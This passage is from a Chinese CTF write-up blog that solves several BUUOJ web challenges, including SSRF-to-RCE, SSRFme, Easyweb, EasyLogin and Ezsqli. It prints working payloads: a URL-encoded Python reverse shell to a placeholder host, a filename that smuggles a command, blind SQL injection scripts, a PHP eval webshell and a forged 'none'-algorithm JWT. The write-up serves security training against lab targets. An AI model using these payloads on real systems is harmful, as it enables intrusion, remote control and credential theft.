class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>读取密钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/page?url=../../../../proc/self/fd/3</span><br></pre></td></tr></table></figure><p>反弹shell即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/no_one_know_the_manager?key=oWrYaRx%2FzaROwW9ZmmsUCf%2BCC5I5Wxj6vUznsHum7pI%3D&amp;shell=export%20RHOST%3D%22your-ip%22%3Bexport%20RPORT%3Dyour-port%3Bpython2%20-c%20&#x27;import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket()%3Bs.connect((os.getenv(%22RHOST%22)%2Cint(os.getenv(%22RPORT%22))))%3B%5Bos.dup2(s.fileno()%2Cfd)%20for%20fd%20in%20(0%2C1%2C2)%5D%3Bpty.spawn(%22sh%22)&#x27;</span><br></pre></td></tr></table></figure><h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>看一下目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?url=/&amp;filename=evo1</span><br><span class="line">/sandbox/&#123;md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;])&#125;/evo1</span><br></pre></td></tr></table></figure><p>发现有<code>readflag</code>，参考这个<a href="https://blog.csdn.net/qq_45521281/article/details/105868449">博客</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先新建一个名为&quot;bash -c /readflag|&quot;的文件，用于之后的命令执行</span><br><span class="line">/?url=&amp;filename=bash -c /readflag|</span><br><span class="line">再利用GET执行bash -c /readflag保存到flag文件</span><br><span class="line">/?url=file:bash -c /readflag|&amp;filename=flag</span><br><span class="line">读取</span><br><span class="line">/sandbox/&#123;md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;])&#125;/flag</span><br></pre></td></tr></table></figure><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>一路查看源码到<code>/fight/</code>这个页面下，发现<code>js</code>有</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Run to scramble original flag</span></span><br><span class="line"><span class="comment">//console.log(scramble(flag, action));</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">scramble</span>(<span class="params">flag, key</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; key.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = key.<span class="title function_">charCodeAt</span>(i) % flag.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">let</span> temp = flag[i];</span><br><span class="line">    flag[i] = flag[n];</span><br><span class="line">    flag[n] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_action</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> action = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;action&quot;</span>).<span class="property">value</span>;</span><br><span class="line">  <span class="keyword">var</span> flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> unscramble function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>flag</code>是个有意义的字符串，猜一下就出来了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</span><br></pre></td></tr></table></figure><blockquote><p>也可以全排列找一下，贴一下网上的脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line">flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>]</span><br><span class="line">item = permutations(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> item:</span><br><span class="line">k = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(i))</span><br><span class="line"><span class="keyword">if</span> k.startswith(<span class="string">&#x27;pctf&#123;hey_boys&#x27;</span>) <span class="keyword">and</span> k[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line"><span class="built_in">print</span>(k)</span><br></pre></td></tr></table></figure></blockquote><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>在<code>robots.txt</code>中看到<code>*.php.bak</code>，进而下载<code>image.php.bak</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><blockquote><p>可以下载文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/image.php?id=\0&amp;path=union select 1,0x757365722e706870-- -</span><br></pre></td></tr></table></figure></blockquote><p>选择盲注获得帐号密码（简单说一下，payload其实就是用反斜杠去修饰<code>&#39;</code>从而把一部分语句整体当作字符串，进而把后面自己的语句拼接进来）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://366d577d-9b43-415c-bb7d-2000a0740d85.node4.buuoj.cn:81/image.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="comment"># 库：ciscnfinal</span></span><br><span class="line">            <span class="comment"># &quot;path&quot;:&quot; and if(ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;,1,0)#&quot;.format(i,mid),</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 表：images,users</span></span><br><span class="line">            <span class="comment"># &quot;path&quot;:&quot; and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;,1,0)#&quot;.format(i,mid),</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 列：username,password</span></span><br><span class="line">            <span class="comment"># 这里注意&#x27;和&quot;被ban掉了，使用十六进制绕一下就好</span></span><br><span class="line">            <span class="comment"># &quot;path&quot;:&quot; and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=0x7573657273),&#123;&#125;,1))&lt;&#123;&#125;,1,0)#&quot;.format(i,mid),</span></span><br><span class="line">            <span class="comment"># &quot;stunum&quot;:&quot;if(ascii(substr((select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;),&#123;&#125;,1))&lt;&#123;&#125;,1,2)&quot;.format(i,mid)</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 帐号：admin</span></span><br><span class="line">            <span class="comment"># &quot;path&quot;:&quot; and if(ascii(substr((select group_concat(username)from users),&#123;&#125;,1))&lt;&#123;&#125;,1,0)#&quot;.format(i,mid),</span></span><br><span class="line">            <span class="comment"># 密码：9f73c6a30158bf8ea651</span></span><br><span class="line">            <span class="string">&quot;path&quot;</span>:<span class="string">&quot; and if(ascii(substr((select group_concat(password)from users),&#123;&#125;,1))&lt;&#123;&#125;,1,0)#&quot;</span>.<span class="built_in">format</span>(i,mid),</span><br><span class="line">            </span><br><span class="line">            <span class="string">&quot;id&quot;</span>:<span class="string">&quot;1\\0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        response = requests.get(url=url,params=params)</span><br><span class="line">        <span class="comment"># print(params[&quot;path&quot;])</span></span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;JFIF&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            r = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27; &#x27;</span> <span class="keyword">or</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>用<code>admin:9f73c6a30158bf8ea651</code>直接登录，随便上传一下发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I logged the file name you uploaded to logs/upload.b43e8deb615da0ea8c6d578b322190ae.log.php. LOL</span><br></pre></td></tr></table></figure><p>访问后发现他会记录你上传的文件名字，用短标签就可以绕过检测</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=&quot;&lt;?=eval($_POST[1]);?&gt;&quot;</span><br></pre></td></tr></table></figure><p>然后访问对应<code>log</code>位置执行<code>1=system(cat /flag);</code>即可</p><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>在<code>/static/js/app.js</code>中发现采用的<code>koa</code>框架，搜索后发现其常用路径为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/controllers/api.js</span><br></pre></td></tr></table></figure><p>访问后获取到源码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">APIError</span> = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).<span class="property">APIError</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span> &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            <span class="variable language_">global</span>.<span class="property">secrets</span> = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.<span class="title function_">randomBytes</span>(<span class="number">18</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span>;</span><br><span class="line">        <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="title function_">push</span>(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            <span class="attr">token</span>: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.<span class="property">header</span>.<span class="property">authorization</span> || ctx.<span class="property">request</span>.<span class="property">body</span>.<span class="property">authorization</span> || ctx.<span class="property">request</span>.<span class="property">query</span>.<span class="property">authorization</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(token.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>()).<span class="property">secretid</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span> &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="variable language_">global</span>.<span class="property">secrets</span>[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.<span class="title function_">verify</span>(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.<span class="property">username</span> &amp;&amp; password === user.<span class="property">password</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.<span class="property">session</span>.<span class="property">username</span> !== <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.<span class="property">session</span>.<span class="property">username</span> = <span class="literal">null</span>;</span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>审计后发现伪造<code>jwt</code>即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(&#123;<span class="string">&quot;secretid&quot;</span>: [],<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>: <span class="string">&quot;evo1&quot;</span>,<span class="string">&quot;iat&quot;</span>: <span class="number">1689834761</span>&#125;,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>访问<code>api/login</code>后带着相应<code>Cookie</code>去访问<code>api/flag</code>即可</p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>过滤了一些字符，盲注一下，要注意的是查表要用<code>sys.schema_table_statistics_with_buffer</code>，因为<code>information_schema</code>被过滤了，然后使用过滤了<code>union</code>的无列名注入获取<code>flag</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43b852f8-5f89-433d-b70f-1e456f01ecd3.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># 库：give_grandpa_pa_pa_pa</span></span><br><span class="line">            <span class="comment"># &quot;id&quot;:&quot;if(ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;,1,2)&quot;.format(i,mid)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 表：users233333333333333,f1ag_1s_h3r3_hhhhh</span></span><br><span class="line">            <span class="comment"># &quot;id&quot;:&quot;if(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;,1,2)&quot;.format(i,mid)</span></span><br><span class="line">        </span><br><span class="line">            <span class="comment"># flag&#123;1fe37544-a156-47e2-971a-ad1ac26a7a0f&#125;</span></span><br><span class="line">            <span class="string">&quot;id&quot;</span>:<span class="string">&quot;if((select * from f1ag_1s_h3r3_hhhhh)&lt;(1,&#x27;&#123;&#125;&#x27;),1,2)&quot;</span>.<span class="built_in">format</span>(flag+<span class="built_in">chr</span>(mid))    </span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        response = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            r = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27; &#x27;</span> <span class="keyword">or</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>在<code>file.php</code>查看各个文件源码</p><h5 id="index-php-2"><a href="#index-php-2" class="headerlink" title="index.php"></a>index.php</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;base.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h5 id="base-php"><a href="#base-php" class="headerlink" title="base.php"></a>base.php</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">session_start</span>(); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">    &lt;title&gt;web3&lt;/title&gt; </span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;</span>&gt; </span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt; </span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">    &lt;nav <span class="class"><span class="keyword">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">default</span>&quot; <span class="title">role</span>=&quot;<span class="title">navigation</span>&quot;&gt; </span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>-<span class="title">fluid</span>&quot;&gt; </span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">header</span>&quot;&gt; </span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">brand</span>&quot; <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;首页&lt;/<span class="title">a</span>&gt; </span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;<span 